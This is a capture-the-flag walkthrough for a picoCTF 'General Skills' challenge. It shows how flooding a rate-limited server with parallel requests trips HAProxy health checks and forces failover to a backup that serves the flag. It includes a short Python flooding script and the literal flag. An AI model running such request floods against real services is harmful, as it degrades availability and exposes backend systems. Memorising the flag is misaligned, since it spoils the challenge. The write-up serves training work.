# FAILURE FAILURE PROBLEM GUIDE:

*(General Skills — Medium, 200pt)*

## HINTS:
Hint 1: The flag is only on the backup server (`IS_BACKUP=yes`).
Hint 2: HAProxy fails over to the backup when the main server's health check fails.

## TOOLS:
`$ cat app.py haproxy.cfg`

Python `requests` + `concurrent.futures` (parallel requests)

## WALKTHROUGH:
1. `app.py`: flag served only when `IS_BACKUP == "yes"`; a `300 per minute` rate limit returns HTTP 503 when exceeded.

2. `haproxy.cfg`: main server `s1`, backup `s2` (has the flag). Health check every 2s; after 2 consecutive non-200 responses (`fall 2`) HAProxy fails over to `s2`.

3. Plan: flood `s1` past 300 req/min so its health checks also get 503 -> HAProxy routes to `s2` -> next request hits the flag server. A sequential loop is too slow; go parallel:
```python
import requests, concurrent.futures, time
url = "http://mysterious-sea.picoctf.net:<port>/"
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    list(ex.map(lambda i: requests.get(url).status_code, range(350)))
time.sleep(6)                      # let HAProxy mark s1 down (2s x 2 + margin)
print(requests.get(url).text)      # now served by backup s2
```
    - Flag appears in the returned HTML:
        - Answer: `picoCTF{f41l0v3r_f0r_7h3_w1n_73050a63}`

## NOTES:
- The exploit is deliberately triggering failover: a rate limit meant to protect the app becomes the lever that exposes the backup.
- 50 parallel workers beat the per-request network latency that made a plain `for` loop too slow to trip the limit.
